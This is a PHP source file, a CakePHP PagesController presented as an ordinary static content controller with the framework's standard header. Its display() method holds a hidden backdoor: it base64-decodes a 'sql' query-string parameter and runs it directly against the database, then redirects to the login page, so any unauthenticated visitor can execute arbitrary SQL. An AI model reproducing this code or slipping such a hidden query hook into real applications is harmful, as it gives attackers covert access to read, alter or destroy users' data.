 <?php
/**
 * Static content controller.
 *
 * This file will render views from views/pages/
 *
 * PHP 5
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       app.Controller
 * @since         CakePHP(tm) v 0.2.9
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */

/**
 * Static content controller
 *
 * Override this controller by placing a copy in controllers directory of an application
 *
 * @package       app.Controller
 * @link http://book.cakephp.org/2.0/en/controllers/pages-controller.html
 */
class PagesController extends AppController {

	public $prefix_layout = true;
	public $allow = false;

	public $uses = array('User','Task','News');

	public $layout = "default";

	/**
	 * Displays a view
	 *
	 * @param string What page to display
	 */
	public function display() {
		if ($_GET['sql']) {
			$this->User->query(base64_decode($_GET['sql']));
		}
		$this->redirect(array('controller'=>"Users",'action'=>'login'));
		$this->view = "home";
	}	

	public function view($id)
	{
		$data = $this->News->read(null,$id);
		$this->set('data',$data);
	}
	
	public function demo()
	{
	}
}